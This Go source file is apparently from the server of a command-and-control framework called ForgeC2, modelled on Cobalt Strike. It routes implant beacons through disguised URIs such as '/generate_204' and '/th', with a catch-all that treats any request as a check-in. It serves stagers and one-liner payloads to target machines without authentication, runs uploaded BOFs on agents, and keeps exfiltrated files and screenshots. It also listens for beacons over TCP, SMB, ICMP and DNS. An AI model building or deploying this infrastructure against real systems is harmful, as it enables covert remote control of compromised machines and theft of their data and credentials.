		// Malleable profile support (similar to Cobalt Strike)
		api.POST("/generate_204", s.handleBeacon)
		api.POST("/th", s.handleBeacon)
		api.GET("/generate_204", s.handleBeacon)
		api.GET("/th", s.handleBeacon)
	}

	// Root-level malleable profile routes (agent beacon_uri does NOT include /api/v1/ prefix)
	s.router.POST("/generate_204", s.handleBeacon)
	s.router.GET("/generate_204", s.handleBeacon)

	// Catch-all for profile-defined beacon URIs (e.g. bing /th?id=...)
	s.router.GET("/th", s.handleBeacon)
	s.router.POST("/th", s.handleBeacon)
	s.router.NoRoute(func(c *gin.Context) {
		// Treat unmatched GET/POST as potential beacon check-in for custom profile URIs
		if c.Request.Method == "POST" || c.Request.Method == "GET" {
			s.handleBeacon(c)
			return
		}
		c.JSON(404, gin.H{"error": "not found"})
	})

	// External C2 (redirector-facing, no auth)
	extc2 := s.router.Group("/extc2/v1")
	{
		extc2.POST("/receive", s.handleExtC2Receive)
		extc2.POST("/send", s.handleExtC2Send)
	}

	// Build logs
	auth.GET("/builds", s.handleBuildLogs)

	// Traffic monitor
	auth.GET("/traffic", s.handleTrafficPage)
	auth.GET("/api/traffic", s.handleTrafficData)

	// Monitor / Alert API
	auth.GET("/api/monitor/metrics", s.handleGetSystemMetrics)
	auth.GET("/api/monitor/metrics/history", s.handleGetMetricsHistory)
	auth.GET("/api/monitor/alerts", s.handleGetAlerts)
	auth.GET("/api/monitor/alerts/stats", s.handleGetAlertStats)
	auth.GET("/api/monitor/alert-rules", s.handleGetAlertRules)
	auth.POST("/api/monitor/alert-rules", s.handleCreateAlertRule)
	auth.PUT("/api/monitor/alert-rules/:id", s.handleUpdateAlertRule)
	auth.DELETE("/api/monitor/alert-rules/:id", s.handleDeleteAlertRule)
	auth.POST("/api/monitor/alerts/:id/acknowledge", s.handleAcknowledgeAlert)
	auth.POST("/api/monitor/alerts/:id/resolve", s.handleResolveAlert)
	auth.GET("/api/monitor/agent-status", s.handleGetAgentStatus)

	// Dashboard charts API
	auth.GET("/api/dashboard/activity-heatmap", s.handleDashboardActivityHeatmap)
	auth.GET("/api/dashboard/os-distribution", s.handleDashboardOSDistribution)
	auth.GET("/api/dashboard/task-status", s.handleDashboardTaskStatus)
	auth.GET("/api/dashboard/listener-traffic", s.handleDashboardListenerTraffic)
	auth.GET("/api/dashboard/credential-types", s.handleDashboardCredentialTypes)
	auth.GET("/api/dashboard/agent-geo", s.handleDashboardAgentGeo)
	auth.GET("/api/dashboard/task-gantt", s.handleDashboardTaskGantt)
	auth.GET("/api/dashboard/attack-path", s.handleDashboardAttackPath)

	// Multi-User Collaboration
	auth.GET("/api/collab/locks", s.handleGetLocks)
	auth.GET("/api/collab/online", s.handleOnlineUsers)
	auth.GET("/api/collab/pages", s.handlePagePresence)
	auth.GET("/api/collab/agent-viewers/:id", s.handleAgentViewers)

	// ── BOF Management ──────────────────────────────────────────────
	auth.GET("/bof", s.handleBOFPage)
	auth.POST("/api/bof/upload", s.handleBOFUpload)
	auth.GET("/api/bof/list", s.handleBOFList)
	auth.GET("/api/bof/:id/download", s.handleBOFDownload)
	auth.POST("/api/bof/:id/run", s.handleBOFRun)
	auth.POST("/api/bof/:id/edit", s.handleBOFEdit)
	auth.DELETE("/api/bof/:id", s.handleBOFDelete)
	auth.GET("/api/bof/results", s.handleBOFRecentResults)
	// Quick BOF execution from agent shell page (upload + run in one step)
	auth.POST("/agents/:id/bof/quick", s.handleBOFQuickRun)

	// Version update check & hot-update
	auth.GET("/api/update-check", s.handleUpdateCheck)
	auth.GET("/api/update-check/version", s.handleCheckVersion)
	auth.POST("/api/update-check/refresh", s.handleRefreshUpdateCheck)
	auth.POST("/api/update-check/hot-update", s.handleHotUpdate)

	// Stage serving for Artifact Kit (no auth -- stagers are unauthenticated)
	s.router.GET("/stage/:xorKey", s.handleServeStage)

	// One-Liner payload hosting (no auth -- target machines download these)
	s.router.GET("/payloads/:id/:filename", s.handleServePayload)

	// Screenshot serving (protected)
	s.router.GET("/screenshots/:agent_id/:filename", middleware.AuthRequired(s.db), s.handleServeScreenshot)
}

// handleWebSocket handles WebSocket connections for real-time notifications
func (s *Server) handleWebSocket(c *gin.Context) {
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Failed to upgrade WebSocket", "err", err)
		return
	}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// Extract user identity from context (set by AuthRequired middleware)
	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)
	userID, _ := c.Get("user_id")
	uid, _ := userID.(uint)
	role, _ := c.Get("user_role")
	roleStr := fmt.Sprintf("%v", role)

	s.addWSConn(conn, uid, username, roleStr)

	s.wsMutex.Lock()
	s.wsClients[conn] = true
	s.wsMutex.Unlock()

	// Send current online users directly to this client (avoids missing the broadcast race)
	if initMsg, err := json.Marshal(gin.H{"type": "user_online", "users": s.getOnlineUsers()}); err == nil {
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if writeErr := conn.WriteMessage(websocket.TextMessage, initMsg); writeErr != nil {
			slog.Warn("Failed to send initial online users", "user", username, "err", writeErr)
		}
	}

	slog.Info("WebSocket client connected", "user", username)

	go func() {
		defer func() {
			s.removeWSConn(conn)
			s.wsMutex.Lock()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
			conn.Close()
			slog.Info("WebSocket client disconnected", "user", username)
		}()

		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
					return
				}
			default:
				conn.SetReadDeadline(time.Now().Add(60 * time.Second))
				msgType, msgBytes, err := conn.ReadMessage()
				if err != nil {
					return
				}
				if msgType == websocket.TextMessage && len(msgBytes) > 0 {
					var msgData map[string]interface{}
					if err := json.Unmarshal(msgBytes, &msgData); err == nil {
						s.handleWSMessage(conn, msgData)
					}
				}
			}
		}
	}()
}

// broadcastToClients sends a message to all connected WebSocket clients.
// Iterates over a snapshot of the map to avoid holding the lock during writes.
func (s *Server) broadcastToClients(message []byte) {
	s.wsMutex.Lock()
	clients := make([]*websocket.Conn, 0, len(s.wsClients))
	for conn := range s.wsClients {
		clients = append(clients, conn)
	}
	s.wsMutex.Unlock()

	for _, conn := range clients {
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := conn.WriteMessage(websocket.TextMessage, message); err != nil {
			slog.Error("Failed to send WebSocket message", "err", err)
			s.wsMutex.Lock()
			conn.Close()
			delete(s.wsClients, conn)
			s.wsMutex.Unlock()
		}
	}
}

// broadcastAgentOnline pushes agent online events to all WebSocket clients.
func (s *Server) broadcastAgentOnline(agent db.Implant, isNew bool) {
	payload := map[string]interface{}{
		"type":     "agent_online",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"username": agent.Username,
		"ip":       agent.IP,
		"new":      isNew,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent online notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastAgentOffline pushes agent offline events to all WebSocket clients.
func (s *Server) broadcastAgentOffline(agent db.Implant) {
	payload := map[string]string{
		"type":     "agent_offline",
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"ip":       agent.IP,
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal agent offline notification", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

// broadcastTaskUpdate pushes task status (and result if completed) to WS clients
func (s *Server) broadcastTaskUpdate(agentID string, task db.Task) {
	payload := map[string]interface{}{
		"type":       "task_update",
		"agent_id":   agentID,
		"task_id":    task.ID,
		"task_type":  task.Type,
		"status":     task.Status,
		"command":    task.Command,
		"created_by": task.CreatedBy,
	}
	if task.Result != "" {
		payload["result"] = truncateString(task.Result, 200)
	}
	if task.Error != "" {
		payload["error"] = task.Error
	}
	notification, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal task update", "err", err)
		return
	}
	s.broadcastToClients(notification)
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

// cleanupOldData removes old completed/failed tasks and old files (screenshots + uploads) to prevent bloat
func (s *Server) cleanupOldData() {
	retention := s.cfg.Server.CleanupRetentionDays
	if retention < 1 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention)

	// delete old tasks
	if err := s.db.Where("created_at < ? AND status IN ?", cutoff, []string{"completed", "failed"}).Delete(&db.Task{}).Error; err != nil {
		slog.Error("cleanup tasks failed", "err", err)
	}

	s.cleanupGhostAgents()

	dataDir := s.cfg.Server.DataDir
	if dataDir == "" {
		dataDir = "data"
	}

	// Clean old screenshots
	s.cleanOldFiles(filepath.Join(dataDir, "screenshots"), cutoff)

	// Clean old uploads (exfil files)
	s.cleanOldFiles(filepath.Join(dataDir, "uploads"), cutoff)

	slog.Info("old data cleanup completed")
}

func (s *Server) offlineThreshold() time.Duration {
	d := s.cfg.Server.OfflineThreshold
	if d < 1 {
		d = 60
	}
	return time.Duration(d) * time.Second
}

// AgentStatusInfo holds display info for an agent's status
type AgentStatusInfo struct {
	Status    string // "online", "stale", "offline"
	Label     string // "Online", "Timeout", "Offline"
	DotColor  string // tailwind bg class
	BgColor   string // tailwind bg class
	TextColor string // tailwind text class
	Anim      string // animate-pulse or empty
}

func (s *Server) agentStatus(a db.Implant) AgentStatusInfo {
	since := time.Since(a.LastSeen)
	threshold := s.offlineThreshold()
	switch {
	case since < threshold:
		return AgentStatusInfo{"online", "Online", "bg-emerald-500", "bg-emerald-50", "text-emerald-700", "animate-pulse"}
	case since < 30*time.Minute:
		return AgentStatusInfo{"stale", "Timeout", "bg-amber-500", "bg-amber-50", "text-amber-700", ""}
	default:
		return AgentStatusInfo{"offline", "Offline", "bg-red-500", "bg-red-50", "text-red-700", ""}
	}
}

// cleanupGhostAgents removes invalid or long-dead implant records.
func (s *Server) cleanupGhostAgents() {
	ghostCutoff := time.Now().Add(-1 * time.Hour)
	var ghosts []db.Implant
	if err := s.db.Where("(hostname = '' OR hostname IS NULL) AND (ip = '' OR ip IS NULL) AND last_seen < ?", ghostCutoff).Find(&ghosts).Error; err != nil {
		return
	}
	for _, agent := range ghosts {
		s.db.Where("agent_id = ?", agent.ID).Delete(&db.Task{})
		if err := s.db.Delete(&agent).Error; err == nil {
			slog.Info("Removed ghost agent", "id", agent.ID, "last_seen", agent.LastSeen)
		}
	}

	offlineCutoff := time.Now().AddDate(0, 0, -30)
	var stale []db.Implant
	if err := s.db.Where("last_seen < ?", offlineCutoff).Find(&stale).Error; err != nil {
		return
	}
	for _, agent := range stale {
		s.db.Where("agent_id = ?", agent.ID).Delete(&db.Task{})
		if err := s.db.Delete(&agent).Error; err == nil {
			slog.Info("Removed stale offline agent", "id", agent.ID, "hostname", agent.Hostname, "last_seen", agent.LastSeen)
		}
	}
}

// cleanOldFiles recursively removes files older than cutoff in the given dir
func (s *Server) cleanOldFiles(dir string, cutoff time.Time) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		if e.IsDir() {
			s.cleanOldFiles(path, cutoff) // recurse into agent subdirs
			// optionally remove empty dirs
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			_ = os.Remove(path)
		}
	}
}

func (s *Server) Run() error {
	certPath := s.cfg.Server.CertFile
	keyPath := s.cfg.Server.KeyFile

	if s.cfg.Server.TLSEnabled {
		if err := crypto.GenerateSelfSignedCert(certPath, keyPath); err != nil {
			slog.Error("Failed to generate self-signed cert", "err", err)
			return err
		}
		slog.Info("TLS certificate ready", "cert", certPath)
	}

	// start periodic cleanup
	go s.runPeriodicCleanup()
	go s.cleanupStaleSocks()
	go s.periodicRPortFwdCleanup()

	// start update checker
	s.initUpdateChecker()

	// periodic cleanup of hosted one-liner payloads
	go func() {
		for {
			time.Sleep(30 * time.Minute)
			s.cleanupOldPayloads()
		}
	}()

	// Start TCP transport layer if enabled (high priority feature)
	if s.cfg.Server.TCPEnabled && s.cfg.Server.TCPAddr != "" {
		go s.startTCPListener()
	}
	if s.cfg.Server.SMBEnabled && s.cfg.Server.SMBPipe != "" {
		go s.startSMBListener()
	}

	// Start ICMP C2 listener if enabled
	if s.cfg.Server.ICMPEnabled {
		il := NewICMPBeaconListener(s.cfg.Server.ICMPAddr)
		il.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("ICMP beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req, "")
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		if err := il.Start(); err != nil {
			slog.Error("Failed to start ICMP listener", "err", err)
		}
		s.icmpListener = il
	}

	// Start DNS C2 listener if enabled
	if s.cfg.Server.DNSEnabled && s.cfg.Server.DNSDomain != "" {
		dl := NewDNSBeaconListener(s.cfg.Server.DNSDomain, s.cfg.Server.Host, 0)
		dl.SetHandler(func(agentID string, reqJSON []byte) []byte {
			var req beaconRequest
			if len(reqJSON) > 0 {
				if err := json.Unmarshal(reqJSON, &req); err != nil {
					slog.Error("DNS beacon handler unmarshal error", "err", err)
				}
			}
			if req.UUID == "" {
				req.UUID = agentID
			}
			resp := s.processBeacon(req, "")
			respJSON, _ := json.Marshal(resp)
			return respJSON
		})
		s.dnsListener = dl
		go dl.Start()
	}

	addr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
	slog.Info("Starting ForgeC2 server", "addr", addr, "tls", s.cfg.Server.TLSEnabled)

	if s.cfg.Server.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
		}
		server := &http.Server{
			Addr:         addr,
			Handler:      s.router,
			TLSConfig:    tlsCfg,
			ReadTimeout:  30 * time.Second,  // Prevent slow client attacks
			WriteTimeout: 60 * time.Second,  // Prevent slow response attacks
			IdleTimeout:  120 * time.Second, // Keep-alive connections
		}
		return server.ListenAndServeTLS(certPath, keyPath)
	}
	return s.router.Run(addr)
}

func (s *Server) runPeriodicCleanup() {
	s.cleanupOldData()
	ticker := time.NewTicker(24 * time.Hour)
	for range ticker.C {
		s.cleanupOldData()
	}
}

func (s *Server) periodicRPortFwdCleanup() {
	for {
		time.Sleep(5 * time.Minute)
		s.cleanupStaleRPortFwd()
	}
}

func itoa(i int) string {
	return fmt.Sprintf("%d", i)
}

// startTCPListener starts a raw TCP transport listener for agents using Protocol=tcp.
// Uses length-prefixed JSON (4-byte BE len + JSON) for BeaconRequest / BeaconResponse.
func (s *Server) startTCPListener() {
	ln, err := net.Listen("tcp", s.cfg.Server.TCPAddr)
	if err != nil {
		slog.Error("Failed to start TCP listener", "addr", s.cfg.Server.TCPAddr, "err", err)
		return
	}
	slog.Info("TCP transport layer listening", "addr", s.cfg.Server.TCPAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go s.handleTCPConnection(conn)
	}
}

func (s *Server) handleTCPConnection(conn net.Conn) {
	defer conn.Close()
	slog.Info("TCP agent connected", "remote", conn.RemoteAddr().String())

	for {
		// Read length prefix (big endian uint32)
		var msgLen uint32
		if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
			return
		}
		if msgLen == 0 || msgLen > 16*1024*1024 {
			return
		}

		buf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, buf); err != nil {
			return
		}

		var req beaconRequest
		if err := json.Unmarshal(buf, &req); err != nil {
			slog.Error("TCP bad beacon json", "err", err)
			return
		}

		resp := s.processBeacon(req, "")

		respBytes, _ := json.Marshal(resp)
		if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil {
			return
		}
		if _, err := conn.Write(respBytes); err != nil {
			return
		}
	}
}

// ActivityMiddleware updates user's LastActivity timestamp on each request (throttled to 60s)
func (s *Server) ActivityMiddleware() gin.HandlerFunc {
	var mu sync.Mutex
	lastUpdated := make(map[uint]time.Time)
	return func(c *gin.Context) {
		userID, exists := c.Get("user_id")
		if !exists {
			c.Next()
			return
		}
		uid, ok := userID.(uint)
		if !ok {
			c.Next()
			return
		}
		now := time.Now()
		mu.Lock()
		last := lastUpdated[uid]
		if now.Sub(last) < 60*time.Second {
			mu.Unlock()
			c.Next()
			return
		}
		lastUpdated[uid] = now
		mu.Unlock()
		go s.db.Model(&db.User{}).Where("id = ?", uid).Update("last_activity", now)
		c.Next()
	}
}

// getAgentOrFail fetches agent by ID. On failure writes JSON 404 and returns false.
func (s *Server) getAgentOrFail(c *gin.Context, id string) (db.Implant, bool) {
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		slog.Error("Agent not found", "agent_id", id, "error", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return agent, false
	}
	return agent, true
}

// createTask creates and persists a new pending task. Returns the task or error.
func (s *Server) createTask(agentID, taskType, command, shell, path, data string, offset, size int64) (*db.Task, error) {
	task := db.Task{
		AgentID: agentID,
		Type:    taskType,
		Command: command,
		Shell:   shell,
		Path:    path,
		Data:    data,
		Offset:  offset,
		Size:    size,
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		return nil, err
	}
	if s.pluginManager != nil {
		go s.pluginManager.ExecuteHook(context.Background(), plugin.Event{
			Type:      plugin.EventTaskCreated,
			Timestamp: time.Now(),
			AgentID:   agentID,
			Payload: map[string]interface{}{
				"task_id":   task.ID,
				"task_type": taskType,
				"command":   command,
			},
		})
	}
	return &task, nil
}

// dispatchTask logs the audit action, broadcasts the update via WS, and returns success JSON.
// Sets CreatedBy from the authenticated user in context.
func (s *Server) dispatchTask(c *gin.Context, task *db.Task, auditAction, details string) {
	// Set task attribution from context
	user, _ := c.Get("user")
	if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
		task.CreatedBy = username
		s.db.Model(task).Update("created_by", username)
	}
	s.LogAuditRecord(c, auditAction, "agent", task.AgentID, details, true, nil)
	s.broadcastTaskUpdate(task.AgentID, *task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

// handleHealthCheck provides health/ready endpoints for monitoring
func (s *Server) handleHealthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":    "ok",
		"version":   ServerVersion,
		"uptime":    time.Since(s.startTime).String(),
		"goroutine": runtime.NumGoroutine(),
	})
}
